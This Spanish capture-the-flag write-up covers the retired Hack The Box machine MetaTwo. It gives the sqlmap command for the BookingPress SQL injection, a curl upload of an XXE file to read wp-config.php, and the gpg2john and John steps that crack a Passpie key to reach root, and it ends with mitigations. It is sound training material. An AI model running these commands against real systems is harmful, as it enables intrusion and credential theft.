---
machine: MetaTwo
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, wordpress, sqli, xxe, ftp, passpie]
---

# MetaTwo — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

WordPress usa el plugin BookingPress, vulnerable a una SQLi no autenticada que filtra el hash del administrador. Con acceso al panel se abusa de un XXE para leer `wp-config.php` y las credenciales FTP; el servidor FTP contiene un script con acceso SSH. La contraseña de root está en Passpie y se recupera crackeando la clave PGP.

## Reconocimiento

```bash
nmap -Pn -sCV -p21,22,80 <IP>
```

- Puertos: `21/tcp` FTP, `22/tcp` SSH y `80/tcp` HTTP.
- Servicios: WordPress con BookingPress, FTP y SSH.
- Tecnologías: WordPress, MySQL, PHP, XML, Passpie y PGP.

## Enumeración

- `metatwo.htb` con WordPress y el plugin BookingPress.
- Versión vulnerable a CVE-2022-0739.
- FTP con un script de envío de correo.
- Usuario `jnelson` y directorio `.passpie`.

## Foothold

La SQLi de BookingPress extrae el hash del administrador; se crackea y se entra a `wp-admin`. Desde allí se sube un XML con entidad externa para leer `wp-config.php`, se obtienen las credenciales FTP y el script del FTP revela la contraseña SSH.

```bash
wpscan --url http://metatwo.htb --enumerate vp
sqlmap -u "http://metatwo.htb/wp-admin/admin-ajax.php" \
  --data="action=bookingpress_front_get_category_booking_1&category_id=1" --batch
# Login en wp-admin y XXE para leer wp-config.php
curl -s -b cookies.txt -F "file=@xxe.xml" http://metatwo.htb/wp-admin/admin-ajax.php
ftp metatwo.htb
ssh jnelson@metatwo.htb
```

## Movimiento lateral

Las credenciales FTP llevan al script que envía correos; ese script contiene la contraseña del usuario `jnelson`, reutilizada para SSH.

## Escalada de privilegios

Passpie guarda la contraseña de root cifrada con una clave PGP. Se extrae el hash con `gpg2john`, se crackea con John y se usa `passpie` para recuperar la credencial.

```bash
ls -la ~/.passpie
gpg2john ~/.passpie/.keys > passpie.hash
john --wordlist=/usr/share/wordlists/rockyou.txt passpie.hash
passpie copy --to stdout
su root
```

## Evidencia

- Hash de administrador extraído con SQLi.
- `wp-config.php` leído por XXE y credenciales FTP.
- Contraseña de root recuperada desde Passpie.

## Lecciones aprendidas

- Un plugin desactualizado puede comprometer todo WordPress.
- El XXE sigue apareciendo en flujos de importación y medios.
- Los gestores de contraseñas locales son un objetivo de escalada.

## Mitigación y detección

- Actualizar WordPress y plugins; aplicar WAF y mínimos privilegios.
- Deshabilitar entidades externas en todos los parsers XML.
- Rotar credenciales FTP/SSH y proteger Passpie con una passphrase fuerte.

## Referencias

- [0xdf — MetaTwo](https://0xdf.gitlab.io/2023/04/29/htb-metatwo.html)
- [IppSec — MetaTwo](https://www.youtube.com/watch?v=Alx5KQWq7ZM)
- [Hack The Box — MetaTwo](https://app.hackthebox.com/machines/metatwo)
